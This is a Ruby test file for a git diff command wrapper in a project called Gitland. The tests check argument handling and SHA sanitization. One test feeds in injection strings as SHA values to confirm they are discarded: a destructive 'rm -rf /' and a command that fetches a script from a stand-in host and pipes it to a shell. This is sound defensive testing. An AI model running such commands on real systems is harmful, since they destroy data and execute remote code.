require "test_helper"

module Gitland
  module Commands
    class DiffTest < ActiveSupport::TestCase
      def setup
        @repository = repositories(:rails)
      end

      test "#execute calls `git diff` with --numstat by default" do
        mock = mock()
        mock.expects(:stdout).returns("")

        Git::CommandLine
          .any_instance
          .expects(:run)
          .with do |*args|
            command, numstat, _ = args
            assert_equal("diff", command)
            assert_equal("--numstat", numstat)
          end
          .returns(mock)

        Gitland::Commands::Diff.new(@repository).execute
      end

      test "#execute calls `git diff <sha_a> <sha_b>` when sha_a and sha_b are passed in the initializer" do
        mock = mock()
        mock.expects(:stdout).returns("")

        sha_a = "6e73a8703f2226442287533f3b9b81013713d05a"
        sha_b = "HEAD"

        Git::CommandLine
          .any_instance
          .expects(:run)
          .with do |*args|
            command, numstat, sha_a, sha_b = args
            assert_equal("diff", command)
            assert_equal("--numstat", numstat)
            assert_equal("6e73a8703f2226442287533f3b9b81013713d05a", sha_a)
            assert_equal("HEAD", sha_b)
          end
          .returns(mock)

        Gitland::Commands::Diff.new(@repository, sha_a: sha_a, sha_b: sha_b).execute
      end

      test "#execute sanitizes sha_1 and sha_2 by checking if they are valid SHA1 first" do
        mock = mock()
        mock.expects(:stdout).returns("")

        sha_a = "rm -rf /"
        sha_b = "curl http://danger.com/exploitme | bin/sh"

        Git::CommandLine
          .any_instance
          .expects(:run)
          .with do |*args|
            args.pop # drop kwargs
            assert_equal([ "diff", "--numstat" ], args)
          end
          .returns(mock)

        Gitland::Commands::Diff.new(@repository, sha_a: sha_a, sha_b: sha_b).execute
      end

      test "#execute passes filepath to `git diff` if filepath is in the initializer" do
        mock = mock()
        mock.expects(:stdout).returns("")

        Git::CommandLine
          .any_instance
          .expects(:run)
          .with do |*args|
            command, numstat, filepath = args
            assert_equal("diff", command)
            assert_equal("--numstat", numstat)
            assert_equal("api/Gemfile", filepath)
          end
          .returns(mock)

        Gitland::Commands::Diff.new(@repository, filepath: "api/Gemfile").execute
      end
    end
  end
end
